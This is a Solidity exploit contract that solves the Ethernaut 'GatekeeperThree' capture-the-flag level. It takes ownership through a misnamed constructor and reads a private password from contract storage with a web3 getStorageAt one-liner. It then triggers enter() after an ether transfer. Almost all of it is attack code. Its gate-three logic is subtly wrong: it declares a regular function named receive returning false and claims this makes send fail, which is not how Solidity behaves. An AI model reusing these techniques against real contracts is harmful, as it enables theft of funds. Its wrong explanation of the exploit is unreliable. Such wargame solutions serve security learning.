// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../contracts/GatekeeperThree.sol';

contract HackGatekeeperThree {
    // Complete with instance's address
    GatekeeperThree originalContract = GatekeeperThree(payable(0x01A89E79BE5f7D4ae521B5fE31dE35d9c13854c3));

    // The first part it's going open gate one and set up gate 2 
    function setup() public {
      // This way we set owner to msg.sender
      originalContract.construct0r();
      // This way we create the SimpleTrick contract
      originalContract.createTrick();
    }

    // Before executing the function enter, we're going to get the second storage of the SimpleTrick contract
    // This second slot has the private variable password
    // We're going to pass it as a parameter of the getAllowance function
    // This way we open the gate two
    // -await contract.getAllowance(await web3.eth.getStorageAt(await contract.trick(), 2))
    

    // Before executing this function it's important to transfer 0.0015 ether to the GatekeeperThree address
    // One we receive the ether, we execute this function
    function hack() public payable {
      originalContract.enter();
    }

    // Because the GatekeeperThree contract it's going to make a send to this contract
    // We setup the return value of the receive function as false
    // This way we open gate three
    function receive() external payable returns(bool) {
      return false;
    }
}